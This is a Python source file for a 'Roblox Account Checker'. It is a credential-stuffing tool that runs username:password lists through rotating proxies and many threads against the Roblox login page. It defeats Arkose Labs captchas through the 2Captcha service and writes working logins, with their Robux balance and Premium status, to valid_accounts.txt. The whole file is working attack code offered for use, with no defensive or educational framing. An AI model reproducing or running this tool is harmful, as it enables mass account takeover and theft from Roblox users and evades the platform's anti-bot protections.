"""
Roblox Account Checker with Real Captcha Solver
Supports 2Captcha API for reliable Arkose Labs (FunCaptcha) solving.
"""
import sys
import os
import time
import threading
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed

from rich.console import Console
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
from rich.table import Table
from rich.text import Text

# Import local modules
from session import RobloxSession
from local_solver import (
    solve_captcha_wrapper, 
    cleanup_solver, 
    setup_keyboard_interrupt,
    configure,
    is_shutdown,
    request_shutdown,
    clear_shutdown
)
from util import load_proxies, load_accounts, get_config

console = Console()
config = get_config()

# --- Global Statistics ---
stats = {
    "total": 0,
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "captcha_solved": 0,
    "captcha_failed": 0,
    "errors": 0
}
stats_lock = threading.Lock()

# Recent Activity Log
activity_log = []
log_lock = threading.Lock()
MAX_LOG_ENTRIES = 6

# Global shutdown flag
_shutdown_requested = threading.Event()


def add_log(message, style="white"):
    """Add a message to the activity log."""
    with log_lock:
        timestamp = time.strftime("%H:%M:%S")
        entry = Text(f"[{timestamp}] {message}", style=style)
        activity_log.insert(0, entry)
        if len(activity_log) > MAX_LOG_ENTRIES:
            activity_log.pop()


def update_stats(status):
    """Update global statistics."""
    with stats_lock:
        stats["checked"] += 1
        if status == "valid":
            stats["valid"] += 1
        elif status == "invalid":
            stats["invalid"] += 1
        elif status == "captcha":
            stats["captcha_solved"] += 1
        elif status == "captcha_failed":
            stats["captcha_failed"] += 1
        else:
            stats["errors"] += 1


def check_account_task(account_line, proxy_dict):
    """Worker function to check a single account."""
    
    # Check for shutdown
    if _shutdown_requested.is_set() or is_shutdown():
        return
        
    try:
        if ':' not in account_line:
            update_stats("invalid")
            return

        parts = account_line.strip().split(':', 1)
        if len(parts) != 2:
            update_stats("invalid")
            return
            
        username = parts[0]
        password = parts[1]
        
        session = RobloxSession(proxy=proxy_dict)
        session.url = "https://www.roblox.com/login"
        session.username = username  # Store for retry
        
        # Check shutdown before expensive operations
        if _shutdown_requested.is_set():
            return
        
        # 1. Login Attempt
        login_success = session.login(username, password)
        
        # Check shutdown after login
        if _shutdown_requested.is_set():
            return
        
        if not login_success:
            if session.needs_captcha:
                # Captcha detected
                add_log(f"⚡ Captcha detected for {username}...", "yellow")
                
                # Check shutdown before captcha solving
                if _shutdown_requested.is_set():
                    add_log(f"⏹️ Shutdown requested, skipping {username}", "yellow")
                    return
                
                # Get fresh CSRF token
                if not session._get_csrf():
                    time.sleep(0.5)
                    if not session._get_csrf():
                        add_log(f"❌ Failed CSRF token for {username}", "red")
                        update_stats("errors")
                        return
                
                # Verify CSRF token
                if not session.csrf_token or len(session.csrf_token) < 10:
                    add_log(f"❌ Invalid CSRF token for {username}", "red")
                    update_stats("errors")
                    return
                    
                add_log(f"🔄 CSRF token obtained for {username}, solving captcha...", "cyan")
                
                # Solve captcha with the wrapper
                solved = solve_captcha_wrapper(session)
                
                # Check shutdown after captcha attempt
                if _shutdown_requested.is_set():
                    return
                
                if solved and session.is_logged_in:
                    update_stats("captcha")
                    add_log(f"✅ {username}: Captcha solved & logged in!", "green")
                else:
                    update_stats("captcha_failed")
                    add_log(f"❌ {username}: Captcha failed", "red")
                    return
            else:
                update_stats("invalid")
                add_log(f"❌ {username}: Invalid credentials", "red")
                return

        # Check shutdown before getting account info
        if _shutdown_requested.is_set():
            return

        # 2. Get Info
        info = session.get_account_info()
        robux = info.get("robux", 0)
        premium = info.get("premium", False)
        
        update_stats("valid")
        
        # Save
        result_line = f"{account_line.strip()} | Robux: {robux} | Premium: {premium}"
        with open("valid_accounts.txt", "a", encoding="utf-8") as f:
            f.write(result_line + "\n")
        
        msg = f"✅ {username} | Robux: {robux}"
        add_log(msg, "green")
        console.print(f"[green]{msg}[/green]")

    except Exception as e:
        update_stats("errors")
        error_msg = str(e)[:40]
        # Silence common errors
        if "greenlet" not in error_msg.lower() and "thread" not in error_msg.lower():
            add_log(f"❌ Error: {error_msg}", "red")


def create_layout():
    """Create the display layout."""
    layout = Layout()
    layout.split(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="footer", size=10)
    )
    return layout


def signal_handler(sig, frame):
    """Handle keyboard interrupt signal."""
    global _shutdown_requested
    
    if _shutdown_requested.is_set():
        # Second Ctrl+C - force exit
        print("\n[!] Force quit!")
        os._exit(1)
    
    print("\n[!] ⌨️ Keyboard interrupt detected!")
    print("[*] Finishing current tasks and shutting down gracefully...")
    print("[*] Press Ctrl+C again to force quit")
    
    _shutdown_requested.set()
    request_shutdown()


def main():
    global _shutdown_requested
    
    # Setup signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    _shutdown_requested.clear()
    clear_shutdown()
    
    console.print("[bold blue]🚀 Starting Roblox Account Checker...[/bold blue]")
    
    # Check for 2Captcha API key
    api_key = config.get("captcha_api_key") or os.environ.get("CAPTCHA_API_KEY") or os.environ.get("TWOCAPTCHA_KEY")
    
    if api_key:
        console.print(f"[green]🔑 2Captcha API key found: {api_key[:10]}...[/green]")
        configure(api_key=api_key, debug=config.get("debug", False))
    else:
        console.print("[yellow]⚠️ No 2Captcha API key found![/yellow]")
        console.print("[yellow]   Captcha solving may not work reliably.[/yellow]")
        console.print("[yellow]   Add 'captcha_api_key' to config.json or set CAPTCHA_API_KEY env var[/yellow]")
        console.print("[yellow]   Get your API key at: https://2captcha.com[/yellow]")
        configure(debug=config.get("debug", False))
    
    accounts = load_accounts("accounts.txt")
    proxies = load_proxies("proxies.txt")
    
    if not accounts:
        console.print("[red]❌ No accounts found! Create 'accounts.txt' (user:pass).[/red]")
        return
    
    if not proxies:
        console.print("[yellow]⚠️ No proxies found. Running without proxies.[/yellow]")
        proxy_list = [None] * len(accounts)
    else:
        proxy_list = (proxies * (len(accounts) // len(proxies) + 1))[:len(accounts)]
    
    threads = config.get("threads", 3)
    console.print(f"[green]⚙️ Loaded {len(accounts)} accounts, {len(proxies)} proxies. Using {threads} threads.[/green]")
    time.sleep(2)

    layout = create_layout()
    
    # Initialize Progress Bar
    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        MofNCompleteColumn(),
        TextColumn("• [green]{task.completed}/{task.total}[/green]"),
        expand=False
    )
    task_id = progress.add_task("Checking Accounts...", total=len(accounts))
    
    layout["body"].update(progress)

    try:
        with Live(layout, refresh_per_second=4, screen=False) as live:
            # Set Header
            layout["header"].update(Panel(
                "[bold white on blue] Roblox Account Checker v3.1 [/bold white on blue]\n"
                "Real 2Captcha API Integration | Ctrl+C to Stop",
                style="bold white on blue"
            ))
            
            def make_footer():
                with stats_lock:
                    stats_text = (
                        f"[green]Valid:[/green] {stats['valid']}  "
                        f"[red]Invalid:[/red] {stats['invalid']}  "
                        f"[yellow]Captcha Solved:[/yellow] {stats['captcha_solved']}  "
                        f"[red]Captcha Failed:[/red] {stats['captcha_failed']}  "
                        f"[magenta]Errors:[/magenta] {stats['errors']}"
                    )
                    
                    panel_content = f"{stats_text}\n"
                    for entry in activity_log:
                        panel_content += f"{entry.plain if hasattr(entry, 'plain') else str(entry)}\n"
                    
                    return Panel(
                        panel_content,
                        title="📊 Statistics & Activity",
                        border_style="green"
                    )

            layout["footer"].update(make_footer())
            live.refresh()

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {
                    executor.submit(check_account_task, acc, prox): acc 
                    for acc, prox in zip(accounts, proxy_list)
                }
                
                for future in as_completed(futures):
                    # Check for shutdown
                    if _shutdown_requested.is_set():
                        console.print("[yellow]⏹️ Stopping remaining tasks...[/yellow]")
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    
                    progress.advance(task_id)
                    layout["footer"].update(make_footer())
                    live.update(layout)
        
        if _shutdown_requested.is_set():
            console.print("\n[yellow]⏹️ Stopped by user request.[/yellow]")
        else:
            console.print("\n[bold green]✅ Complete! Check 'valid_accounts.txt'[/bold green]")
        
    except KeyboardInterrupt:
        console.print("\n[red]⏹️ Stopped by keyboard interrupt.[/red]")
    except Exception as e:
        console.print(f"\n[red]💥 Crash: {e}[/red]")
        import traceback
        traceback.print_exc()
    finally:
        cleanup_solver()
        
        # Print final stats
        with stats_lock:
            console.print(f"\n[bold]📊 Final Statistics:[/bold]")
            console.print(f"   [green]Valid:[/green] {stats['valid']}")
            console.print(f"   [red]Invalid:[/red] {stats['invalid']}")
            console.print(f"   [yellow]Captcha Solved:[/yellow] {stats['captcha_solved']}")
            console.print(f"   [red]Captcha Failed:[/red] {stats['captcha_failed']}")
            console.print(f"   [magenta]Errors:[/magenta] {stats['errors']}")


if __name__ == "__main__":
    main()